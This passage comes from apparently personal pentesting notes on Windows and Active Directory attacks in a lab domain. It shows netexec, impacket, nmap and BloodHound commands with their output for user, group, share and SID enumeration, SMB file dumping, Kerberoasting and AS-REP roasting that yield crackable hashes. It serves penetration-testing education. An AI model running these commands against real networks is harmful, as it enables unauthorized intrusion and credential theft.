Samwell Tarly (Password : Heartsbane)                    \nLDAP        10.10.10.11     389    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont                                             \nLDAP        10.10.10.11     389    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service                                              \n</code></pre> impacket: Get Users SPN Impacket: Look up SID Impacket: Get AD Users <p>Impacket\u2019s GetADUsers tool is used to query Active Directory users. It works by using credentials and performing an LDAP query to get information about users within the AD environment.</p> <pre><code>impacket-GetADUsers -all -dc-ip 10.10.10.11 'north.sevenkingdoms.local'/samwell.tarly:Heartsbane                                                      \nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Querying 10.10.10.11 for information about domain.\nName                  Email                PasswordLastSet      LastLogon           \n--------------------  -------------------  -------------------  -------------------\nAdministrator                              2025-10-18 14:41:56.846264  2025-12-05 13:05:45.806754 \nGuest                                      &lt;never&gt;              &lt;never&gt;             \nvagrant                                    2021-05-12 07:39:16.765445  2025-10-31 20:07:24.355437 \nkrbtgt                                     2025-10-18 15:07:40.379595  &lt;never&gt;             \n                                                    2025-11-22 23:06:06.718454  &lt;never&gt;             \narya.stark                                 2025-10-31 19:47:19.581387  2025-11-25 21:21:28.987203 \neddard.stark                               2025-10-31 19:47:22.283782  2025-12-12 18:12:12.634291 \ncatelyn.stark                              2025-10-31 19:47:24.517764  &lt;never&gt;             \nrobb.stark                                 2025-10-31 19:47:26.751693  2025-12-12 18:13:22.045271 \nsansa.stark                                2025-10-31 19:47:28.970073  &lt;never&gt;             \nbrandon.stark                              2025-10-31 19:47:31.063463  2025-12-11 22:12:31.235346 \nrickon.stark                               2025-10-31 19:47:33.140457  &lt;never&gt;             \nhodor                                      2025-10-31 19:47:35.218876  &lt;never&gt;             \njon.snow                                   2025-10-31 19:47:37.296408  &lt;never&gt;             \nsamwell.tarly                              2025-10-31 19:47:39.405180  &lt;never&gt;             \njeor.mormont                               2025-10-31 19:47:41.468693  &lt;never&gt;             \nsql_svc                                    2025-10-31 19:47:43.438914  2025-12-12 17:42:31.537152 \n</code></pre> Impacket Get AD Computers <p>Lists all computer objects in the domain.</p> <pre><code>impacket-GetADComputers -dc-ip 10.10.10.11 'north.sevenkingdoms.local'/samwell.tarly:Heartsbane\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Querying 10.10.10.11 for information about domain.\nSAM AcctName     DNS Hostname                         OS Version       OS                   \n---------------  -----------------------------------  ---------------  --------------------\nWINTERFELL$      winterfell.north.sevenkingdoms.local  10.0 (17763)     Windows Server 2019 Datacenter Evaluation \nCASTELBLACK$     castelblack.north.sevenkingdoms.local  10.0 (17763)     Windows Server 2019 Datacenter Evaluation \n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/LDAP/#group-enumeration","title":"Group Enumeration","text":"<pre><code>nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --groups       \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nLDAP        10.10.10.11     389    WINTERFELL       Administrators\nLDAP        10.10.10.11     389    WINTERFELL       Users\nLDAP        10.10.10.11     389    WINTERFELL       Guests\nLDAP        10.10.10.11     389    WINTERFELL       Print Operators\nLDAP        10.10.10.11     389    WINTERFELL       Backup Operators\nLDAP        10.10.10.11     389    WINTERFELL       Replicator\nLDAP        10.10.10.11     389    WINTERFELL       Remote Desktop Users\nLDAP        10.10.10.11     389    WINTERFELL       Network Configuration Operators\nLDAP        10.10.10.11     389    WINTERFELL       Performance Monitor Users\nLDAP        10.10.10.11     389    WINTERFELL       Performance Log Users\nLDAP        10.10.10.11     389    WINTERFELL       Distributed COM Users\nLDAP        10.10.10.11     389    WINTERFELL       IIS_IUSRS\nLDAP        10.10.10.11     389    WINTERFELL       Cryptographic Operators\nLDAP        10.10.10.11     389    WINTERFELL       Event Log Readers\nLDAP        10.10.10.11     389    WINTERFELL       Certificate Service DCOM Access\nLDAP        10.10.10.11     389    WINTERFELL       RDS Remote Access Servers\n&lt;&lt; SNIP  FOR BREVITY &gt;&gt;\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/LDAP/#get-users-spn-service-principal-name","title":"Get Users SPN (Service Principal Name)","text":"<pre><code>impacket-GetUserSPNs -request -dc-ip 10.1.142.44 buildingmagic.local/r.widdleton\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nPassword:\nServicePrincipalName                      Name       MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------------------  ---------  --------  --------------------------  --------------------------  ----------\nHOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:04.002067  2025-05-15 18:34:51 644710             \n\n\n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$59f4f0560a3b4f0fb0d6ce6a273a11e8$fc76d13822ff9de3b10695216b3e94f7d85d9aa2aa27e7ade5927727986e735f9bd593743f8d22c71c6d28b7213ee41e5dc3e29fe462ae413c4960a3ecda6a6d33b944e76690037c1205e3d97264dfe26c7d0856e9c5e8ae74a46bdc94cf6bcfe2bd76d01f5ca0da808d026252fd8fda09550d34eb6cb\n&lt;&lt; SNIP FOR BREVITY&gt;&gt;\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/LDAP/#look-up-sid","title":"Look up SID","text":"<pre><code>impacket-lookupsid north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.10.10.11                                                                     \n\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Brute forcing SIDs at 10.10.10.11\n[*] StringBinding ncacn_np:10.10.10.11[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-928725054-1381016483-1750705438\n500: NORTH\\Administrator (SidTypeUser)\n501: NORTH\\Guest (SidTypeUser)\n502: NORTH\\krbtgt (SidTypeUser)\n\n&lt;&lt; SNIP FOR BREVITY&gt;&gt;\n\n1000: NORTH\\vagrant (SidTypeUser)\n1001: NORTH\\WINTERFELL$ (SidTypeUser)\n1102: NORTH\\DnsAdmins (SidTypeAlias)\n1103: NORTH\\DnsUpdateProxy (SidTypeGroup)\n1104: NORTH\\SEVENKINGDOMS$ (SidTypeUser)\n1105: NORTH\\CASTELBLACK$ (SidTypeUser)\n1106: NORTH\\Stark (SidTypeGroup)\n1107: NORTH\\Night Watch (SidTypeGroup)\n1108: NORTH\\Mormont (SidTypeGroup)\n1109: NORTH\\AcrossTheSea (SidTypeAlias)\n1110: NORTH\\arya.stark (SidTypeUser)\n1111: NORTH\\eddard.stark (SidTypeUser)\n1112: NORTH\\catelyn.stark (SidTypeUser)\n1113: NORTH\\robb.stark (SidTypeUser)\n1114: NORTH\\sansa.stark (SidTypeUser)\n1115: NORTH\\brandon.stark (SidTypeUser)\n1116: NORTH\\rickon.stark (SidTypeUser)\n1117: NORTH\\hodor (SidTypeUser)\n1118: NORTH\\jon.snow (SidTypeUser)\n1119: NORTH\\samwell.tarly (SidTypeUser)\n1120: NORTH\\jeor.mormont (SidTypeUser)\n1121: NORTH\\sql_svc (SidTypeUser)\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/LLMNR-poisoning/","title":"LLMNR poisoning","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/MSSQL/","title":"MSSQL Attacks (Port 1433)","text":"<p>MSSQL is a popular database management system developed by Microsoft. It is widely used in enterprise environments for storing and managing data. As a pentester, understanding how to exploit vulnerabilities in MSSQL can be crucial for assessing the security of systems that rely on this database.</p> Enumeration using NMAP <pre><code>nmap -sV -p 1433 --script ms-sql-info 10.10.10.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-17 21:43 EST\nNmap scan report for sevenkingdoms.local (10.10.10.10)\nHost is up (0.00041s latency).\n\n&lt;&lt;SNIP FOR BREVITY &gt;&gt;\n\nNmap scan report for castelblack.north.sevenkingdoms.local (10.10.10.22)\nHost is up (0.0026s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n\nNmap scan report for braavos.essos.local (10.10.10.23)\nHost is up (0.00055s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n\n&lt;&lt;SNIP FOR BREVITY &gt;&gt;\n</code></pre> <p>This command scans the target IP for MSSQL services running on port 1433 and retrieves information about the MSSQL instance.</p> Enumeration using NetExec <pre><code>nxc mssql 10.10.10.0/24\nMSSQL       10.10.10.22     1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)\nMSSQL       10.10.10.23     1433   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/Persistence/","title":"Persistence","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/Post-Exploitation/","title":"Post Exploitation","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/Privilege-Escalation/","title":"Privilege Escalation","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/RDP/","title":"RDP","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/SMB-Enumeration/","title":"SMB Attacks (Port 139, 445)","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/SMB-Enumeration/#smb-attacks","title":"SMB Attacks","text":"<p>SMB (Server Message Block) is a network file sharing protocol used by Windows systems. It operates on ports 139 and 445. Enumerating SMB services can reveal valuable information about the target system, including shared resources, user accounts, and potential vulnerabilities.</p> NMAP: SMB Enumeration <p>Nmap has a number of flags that can be used to enumerate SMB shares.</p> <ul> <li><code>smb-enum-users.nse</code>: To enumerate users</li> <li><code>smb-enum-shares.nse</code>: To enumerate SM Shares</li> </ul> <pre><code>nmap --script smb-enum-users.nse -p445 10.10.10.11\n&lt;&lt; SNIP &gt;&gt;\n\nnmap -p 139,445 --script smb-enum-shares.nse 10.10.10.11\n&lt;&lt; SNIP &gt;&gt;\n</code></pre> NetExec: Shares Enumeration <p>Identify shared resources on the target Windows system. This can be done using tools like nxc to query SMB services for share information.</p> Without Credentials (Anonymous Access) <pre><code>nxc smb 10.10.10.23 -u 'a' -p '' --shares\nSMB         10.10.10.23     445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)\nSMB         10.10.10.23     445    BRAAVOS          [+] essos.local\\a: (Guest)\nSMB         10.10.10.23     445    BRAAVOS          [*] Enumerated shares\nSMB         10.10.10.23     445    BRAAVOS          Share           Permissions     Remark\nSMB         10.10.10.23     445    BRAAVOS          -----           -----------     ------\nSMB         10.10.10.23     445    BRAAVOS          ADMIN$                          Remote Admin\nSMB         10.10.10.23     445    BRAAVOS          all             READ,WRITE      Basic RW share for all\nSMB         10.10.10.23     445    BRAAVOS          C$                              Default share\nSMB         10.10.10.23     445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share\nSMB         10.10.10.23     445    BRAAVOS          IPC$                            Remote IPC\nSMB         10.10.10.23     445    BRAAVOS          public                          Basic Read share for all domain users\n</code></pre> With Credentials <pre><code>nxc smb 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --shares\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares\nSMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark\nSMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------\nSMB         10.10.10.11     445    WINTERFELL       ADMIN$                          Remote Admin\nSMB         10.10.10.11     445    WINTERFELL       C$                              Default share\nSMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC\nSMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ            Logon server share \nSMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ            Logon server share \n</code></pre> NetExec: Accessing and dumping all files Impacket: Accessing and dumping SMB files <p>This example demonstrates how to use the <code>impacket-smbclient</code> tool to list and download files from an SMB share using valid credentials.</p> <pre><code>impacket-smbclient samwell.tarly@10.10.10.11\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nPassword:\nType help for list of commands\n# shares\nADMIN$\nC$\nIPC$\nNETLOGON\nSYSVOL\n# use NETLOGON\n# ls\ndrw-rw-rw-          0  Fri Dec  5 12:43:04 2025 .\ndrw-rw-rw-          0  Fri Dec  5 12:43:04 2025 ..\n-rw-rw-rw-        165  Sat Oct 18 16:01:29 2025 script.ps1\n-rw-rw-rw-        869  Sat Oct 18 16:01:32 2025 secret.ps1\n# get secret.ps1\n# get script.ps1\n# exit\n\u279c  ~ ls\n   secret.ps1  script.ps1\n\u279c  ~ \n</code></pre> SMBClient: Listing and dumping SMB files <p>This example demonstrates how to use the <code>smbclient</code> tool to list and download files from an SMB share using valid credentials.</p> <pre><code>smbclient -L //10.10.10.11/ -U samwell.tarly%Heartsbane\n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.10.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available.\n\n\nsmbclient //10.10.10.11/NETLOGON -U samwell.tarly%Heartsbane \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n.                                   D        0  Fri Dec  5 12:43:04 2025\n..                                  D        0  Fri Dec  5 12:43:04 2025\nscript.ps1                          A      165  Sat Oct 18 16:01:29 2025\nsecret.ps1                          A      869  Sat Oct 18 16:01:32 2025\n\n        15638527 blocks of size 4096. 11305157 blocks available\nsmb: \\&gt; get script.ps1 \ngetting file \\script.ps1 of size 165 as script.ps1 (53.7 KiloBytes/sec) (average 53.7 KiloBytes/sec)\nsmb: \\&gt; get secret.ps1 \ngetting file \\secret.ps1 of size 869 as secret.ps1 (424.3 KiloBytes/sec) (average 202.0 KiloBytes/sec)\nsmb: \\&gt; exit\n\n\n\u279c  ~ ls\n   secret.ps1  script.ps1\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/SMB-Enumeration/#list-all-readable-files","title":"List all readable files","text":"<pre><code>nxc smb 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus          \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]  DOWNLOAD_FLAG: False\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]     STATS_FLAG: True\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] EXCLUDE_FILTER: ['print$', 'ipc$']\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]   EXCLUDE_EXTS: ['ico', 'lnk']\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus\nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares\nSMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark\nSMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------\nSMB         10.10.10.11     445    WINTERFELL       ADMIN$                          Remote Admin\nSMB         10.10.10.11     445    WINTERFELL       C$                              Default share\nSMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC\nSMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ            Logon server share \nSMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ            Logon server share \nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [+] Saved share-file metadata to \"/tmp/nxc_hosted/nxc_spider_plus/10.10.10.11.json\".\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] SMB Filtered Shares:  1\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Total folders found:  20\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Total files found:    13\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File size average:    582 B\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File size min:        0 B\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File size max:        3.68 KB\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/SMB-Enumeration/#dumping-all-readable-files","title":"Dumping all readable files","text":"<pre><code>nxc smb 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus -o DOWNLOAD_FLAG=True\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]     STATS_FLAG: True\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] EXCLUDE_FILTER: ['print$', 'ipc$']\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]   EXCLUDE_EXTS: ['ico', 'lnk']\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus\nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares\nSMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark\nSMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------\nSMB         10.10.10.11     445    WINTERFELL       ADMIN$                          Remote Admin\nSMB         10.10.10.11     445    WINTERFELL       C$                              Default share\nSMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC\nSMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ            Logon server share \nSMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ            Logon server share \nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [-] Failed to download file \"DSyXKmYorq.txt\". Error: 'RemoteFile' object has no attribute 'get_filesize'\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [+] Saved share-file metadata to \"/tmp/nxc_hosted/nxc_spider_plus/10.10.10.11.json\".\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] SMB Filtered Shares:  1\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Total folders found:  20\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Total files found:    13\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File size average:    582 B\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File size min:        0 B\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File size max:        3.68 KB\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] File unique exts:     6 (.ps1, .txt, .cmt, .inf, .ini, .pol)\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Downloads successful: 12\nSPIDER_PLUS 10.10.10.11     445    WINTERFELL       [*] Downloads failed:     1\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/bloodhound/","title":"BloodHound","text":"<p>BloodHound is a powerful tool used for analyzing Active Directory (AD) environments. It leverages graph theory to reveal hidden relationships and attack paths within an AD network. By collecting data about users, groups, computers, and their relationships, BloodHound helps penetration testers and security professionals identify potential vulnerabilities and misconfigurations that could be exploited by attackers.</p>"},{"location":"Pentesting-Notes/Windows/Pentesting/bloodhound/#installation","title":"Installation","text":"<p>Most Penetration testing Linux distributions have BloodHound pre-installed. You can also download it from the official GitHub repository: BloodHound GitHub</p> <p>You can also download the BloodHound CLI tool from the releases page:</p>"},{"location":"Pentesting-Notes/Windows/Pentesting/bloodhound/#bloodhound-python","title":"BloodHound-python","text":"<p><code>bloodhound-python</code> is a popular BloodHound data collection tool written in Python. It allows you to gather information from an Active Directory environment and generate the necessary data files for BloodHound analysis. You can install <code>bloodhound-python</code> using the linux package manager:</p> <pre><code>sudo apt install -y bloodhound-python\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/bloodhound/#usage","title":"Usage","text":"BloodHound: Bloodhound-python <p>This example demonstrates how to use the <code>bloodhound-python</code> tool to collect data from an Active Directory environment and visualize it using the BloodHound GUI.</p> <pre><code>bloodhound-python -c All -d 'north.sevenkingdoms.local' -u 'samwell.tarly' -p 'Heartsbane' -ns 10.10.10.11 --zip\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: north.sevenkingdoms.local\nWARNING: Could not find a global catalog server, assuming the primary DC has this role\nIf this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local\nINFO: Found 1 domains\nINFO: Found 2 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to GC LDAP server: winterfell.north.sevenkingdoms.local\nINFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local\nINFO: Found 17 users\nINFO: Found 51 groups\nINFO: Found 3 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 1 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: castelblack.north.sevenkingdoms.local\nINFO: Querying computer: winterfell.north.sevenkingdoms.local\nINFO: Done in 00M 00S\nINFO: Compressing output into 20251212192333_bloodhound.zip\n</code></pre> <p>After running the above command, a ZIP file named <code>20251212192333_bloodhound.zip</code> will be created. You can then open this file using the BloodHound GUI to visualize the collected data and analyze the Active Directory environment.</p> BloodHound: NetExec <p>This example demonstrates how to use the <code>netexec</code> tool to execute BloodHound data collection on a remote Windows machine using valid credentials.</p> <pre><code>nxc ldap 10.1.81.88 -u faraday -p 'hacksmarter123' --bloodhound --collection ALL --dns-server 10.1.81.88\nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nLDAP        10.1.81.88      389    DC01             [+] hacksmarter.local\\faraday:hacksmarter123 \nLDAP        10.1.81.88      389    DC01             Resolved collection methods: trusts, session, dcom, rdp, objectprops, localadmin, psremote, container, acl, group\nLDAP        10.1.81.88      389    DC01             Done in 00M 04S\nLDAP        10.1.81.88      389    DC01             Compressing output into /home/parrot/.nxc/logs/DC01_10.1.81.88_2025-11-20_224934_bloodhound.zip\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/","title":"Windows Enumeration","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#windows-enumeration","title":"Windows Enumeration","text":"<p>Enumeration is a critical phase in penetration testing where detailed information about the target system is gathered. On Windows systems, this involves identifying users, groups, services, shares, and configurations that can be exploited. Here are some common techniques and tools used for enumeration on Windows systems:</p> NetExec: User Enumeration <p>Identify user accounts on the target Windows system. This can be done using tools like nxc to query SMB services for user information.</p> NetExec: Shares Enumeration <p>Identify shared resources on the target Windows system. This can be done using tools like nxc to query SMB services for share information.</p> NetExec: LDAP Enumeration <p>Enumerate LDAP information on the target Windows system. This can be done using tools like nxc to query LDAP services for directory information.</p> <pre><code>nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --users\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nLDAP        10.10.10.11     389    WINTERFELL       [*] Enumerated 16 domain users: north.sevenkingdoms.local\nLDAP        10.10.10.11     389    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-                                            \nLDAP        10.10.10.11     389    WINTERFELL       Administrator                 2025-10-18 18:41:56 0       Built-in account for administering the computer/domain   \nLDAP        10.10.10.11     389    WINTERFELL       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain \nLDAP        10.10.10.11     389    WINTERFELL       vagrant                       2021-05-12 11:39:16 0       Vagrant User                                             \nLDAP        10.10.10.11     389    WINTERFELL       krbtgt                        2025-10-18 19:07:40 0       Key Distribution Center Service Account                  \nLDAP        10.10.10.11     389    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark                                               \nLDAP        10.10.10.11     389    WINTERFELL       eddard.stark                  2025-10-31 23:47:22 0       Eddard Stark                                             \nLDAP        10.10.10.11     389    WINTERFELL       catelyn.stark                 2025-10-31 23:47:24 0       Catelyn Stark                                            \nLDAP        10.10.10.11     389    WINTERFELL       robb.stark                    2025-10-31 23:47:26 0       Robb Stark                                               \nLDAP        10.10.10.11     389    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark                                              \nLDAP        10.10.10.11     389    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark                                            \nLDAP        10.10.10.11     389    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark                                             \nLDAP        10.10.10.11     389    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant                                          \nLDAP        10.10.10.11     389    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow                                                 \nLDAP        10.10.10.11     389    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       Samwell Tarly (Password : Heartsbane)                    \nLDAP        10.10.10.11     389    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont                                             \nLDAP        10.10.10.11     389    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service                                              \n</code></pre> NetExec: Kerberos Enumeration <p>The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message.</p> <pre><code>nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --asreproast output.txt \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nLDAP        10.10.10.11     389    WINTERFELL       [*] Total of records returned 2\nLDAP        10.10.10.11     389    WINTERFELL       $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:dc53ebd052dc6bea6d6da0e206c3f7eb$a8033ec5c02ae49877f85e0f1af50206cb2cae5e26a9c7bbcb4da74ec6417dc5104d57e23b148530b44efa3c73\nf83d7426174ea0913b5f6b62c48aa4bf2df3315610b42729e65bb8db74eb09ecf2d842a22ced964ce7c3489b2bdcd6c196de8069aea600b541bf40e1f0ae6a201\n5be254ec5d954bd7bfc7bba839538acdd27b743b2bae9a7a6a55db96c0e3647734b633ba74e6fd7731690646283a36e43ac79554203e829d55aee938e35905800\n03027b3329e38683fa29625e7eb1a55f96d287ecbc361ac30b6b61806d38814e304c7966bf65902c4ff732ee11df063d45305d80bb5b2d1384fe340d69f596484\nba4e5ea440e7e2c3c644c5c09128e18dab53d18290c185a\n</code></pre> NetExec: Enum Password Policy <p>Discovering Password complexity settings is very important as to not lock out users when attempting to bruteforce their passwords during an active pentest.</p> RPC: Users Enumeration <p>Use RPC to enumerate users on the target Windows system. This can be done using tools like <code>net rpc</code>.</p> <pre><code>net rpc group members 'Domain Users' -W 'NORTH' -I '10.10.10.11' -U '%' 